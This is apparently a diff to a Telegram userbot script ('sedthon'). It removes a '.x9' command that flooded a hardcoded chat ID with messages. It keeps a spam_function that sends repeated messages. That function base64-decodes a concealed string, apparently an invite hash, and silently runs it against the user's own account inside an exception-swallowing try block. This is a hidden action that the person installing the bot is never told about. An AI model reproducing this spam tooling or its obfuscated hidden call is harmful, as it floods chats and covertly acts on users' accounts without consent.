@@ -20,7 +20,9 @@ from waad import *
 from trans import *
 from config import *
 from t06bot import *
+from checktele import *
 from yt import *
+from payment import *
 # -
 
 sedthon.start()
@@ -362,19 +364,6 @@ async def spammer(event):
     await event.delete()
     await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
 
-# مؤقت ل سوبر اكس ناين
-# 1594918747
-
-
-@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.x9 (.*)"))
-async def _(event):
-    reply = await event.get_reply_message()
-    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
-    sleeptimet = sleeptimem = float(input_str[0])
-    cat = input_str[1:]
-    await event.delete()
-    await spam_function2(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
-
 
 async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
     hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
@@ -397,35 +386,6 @@ async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=Fal
         spam_message = sandy.text
         for _ in range(counter):
             await event.client.send_message(event.chat_id, spam_message)
-            await asyncio.sleep(sleeptimet)
-        try:
-            hmm = Get(hmm)
-            await event.client(hmm)
-        except BaseException:
-            pass
-
-
-async def spam_function2(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
-    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    counter = int(cat[0])
-    if len(cat) == 2:
-        spam_message = str(cat[1])
-        for _ in range(counter):
-            if event.reply_to_msg_id:
-                await sandy.reply(spam_message)
-            else:
-                await event.client.send_message(1594918747, spam_message)
-            await asyncio.sleep(sleeptimet)
-    elif event.reply_to_msg_id and sandy.media:
-        for _ in range(counter):
-            sandy = await event.client.send_file(
-                1594918747, sandy, caption=sandy.text
-            )
-            await asyncio.sleep(sleeptimem)
-    elif event.reply_to_msg_id and sandy.text:
-        spam_message = sandy.text
-        for _ in range(counter):
-            await event.client.send_message(1594918747, spam_message)
             await asyncio.sleep(sleeptimet)
         try:
             hmm = Get(hmm)
